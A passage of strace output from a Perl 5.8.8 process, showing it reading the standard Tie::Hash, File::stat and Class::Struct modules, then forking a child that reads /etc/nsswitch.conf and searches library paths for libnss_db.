#  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
6687  07:15:03.400792 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
6687  07:15:03.401377 read(8, "", 4096) = 0
6687  07:15:03.401394 close(8)          = 0
6687  07:15:03.401425 stat64("/etc/perl/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.401440 stat64("/etc/perl/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.401454 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.401467 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409331 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409331 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409331 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409340 stat64("/usr/lib/perl5/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409353 stat64("/usr/share/perl5/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409370 stat64("/usr/share/perl5/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409383 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409396 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409410 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409423 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
6687  07:15:03.409445 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.409460 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.409472 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.409490 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
6687  07:15:03.409944 stat64("/etc/perl/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409962 stat64("/etc/perl/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.409976 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.409989 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.410004 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.410017 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.410031 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.410043 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.410057 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.410069 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.410082 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.410095 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.410109 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.410122 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
6687  07:15:03.410143 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
6687  07:15:03.410159 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaceb8) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.410170 _llseek(10, 0, [0], SEEK_CUR) = 0
6687  07:15:03.410189 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
6687  07:15:03.410628 brk(0x82de000)    = 0x82de000
6687  07:15:03.411029 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
6687  07:15:03.411629 _llseek(10, 6916, [6916], SEEK_SET) = 0
6687  07:15:03.411646 _llseek(10, 0, [6916], SEEK_CUR) = 0
6687  07:15:03.411656 close(10)         = 0
6687  07:15:03.411884 _llseek(8, 1334, [1334], SEEK_SET) = 0
6687  07:15:03.419252 _llseek(8, 0, [1334], SEEK_CUR) = 0
6687  07:15:03.419281 close(8)          = 0
6687  07:15:03.419919 brk(0x82ff000)    = 0x82ff000
6687  07:15:03.420065 _llseek(6, 2689, [2689], SEEK_SET) = 0
6687  07:15:03.420080 _llseek(6, 0, [2689], SEEK_CUR) = 0
6687  07:15:03.420091 close(6)          = 0
6687  07:15:03.420304 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dc5908) = 6688
6688  07:15:03.420403 getppid()         = 6687
6688  07:15:03.420882 open("/etc/nsswitch.conf", O_RDONLY) = 6
6688  07:15:03.420906 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6688  07:15:03.420925 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f8b000
6688  07:15:03.420943 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6688  07:15:03.420994 read(6, "", 4096) = 0
6688  07:15:03.421004 close(6)          = 0
6688  07:15:03.421014 munmap(0xb7f8b000, 4096) = 0
6688  07:15:03.421040 open("/etc/ld.so.cache", O_RDONLY) = 6
6688  07:15:03.421054 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6688  07:15:03.421071 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d92000
6688  07:15:03.421082 close(6)          = 0
6688  07:15:03.421093 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6688  07:15:03.421111 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421125 stat64("/lib/tls/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421139 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421153 stat64("/lib/tls/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421164 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421177 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421195 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421237 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421272 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421285 stat64("/lib/tls/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421296 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421308 stat64("/lib/tls/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421319 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421332 stat64("/lib/tls/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421343 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421354 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421371 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421384 stat64("/lib/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421395 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421407 stat64("/lib/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421418 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421430 stat64("/lib/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421441 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421452 stat64("/lib/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421463 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421475 stat64("/lib/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421486 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421498 stat64("/lib/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421508 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421520 stat64("/lib/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421534 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421546 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421562 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421575 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421587 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421600 stat64("/usr/lib/tls/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
